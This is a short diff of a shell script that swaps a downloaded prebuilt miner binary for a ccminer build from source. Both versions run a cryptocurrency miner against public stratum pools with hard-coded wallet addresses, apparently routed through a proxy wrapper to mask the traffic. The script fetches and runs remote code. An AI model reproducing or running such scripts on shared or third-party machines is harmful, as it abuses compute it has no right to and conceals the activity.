@@ -29,11 +29,11 @@ sleep .2
 
 ./graftcp/graftcp curl ifconfig.me
 
-echo "ln -s /usr/lib/libcrypt.so /usr/lib/libcrypt.so.1"
 echo " "
-ln -s /usr/lib/libcrypt.so /usr/lib/libcrypt.so.1
-./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/hellminer
-chmod +x hellminer
+echo " "
+echo " "
 
-./graftcp/graftcp ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bigbang -p x --cpu 2
-sleep 2
+./graftcp/graftcp git clone –single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh
+./build.sh
+./ccminer -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u DBzjgXkfYtotoLg1hKRZugd7vDotq7TW1k -p  c=DGB,mc=VRSC,ID=bigbang
+
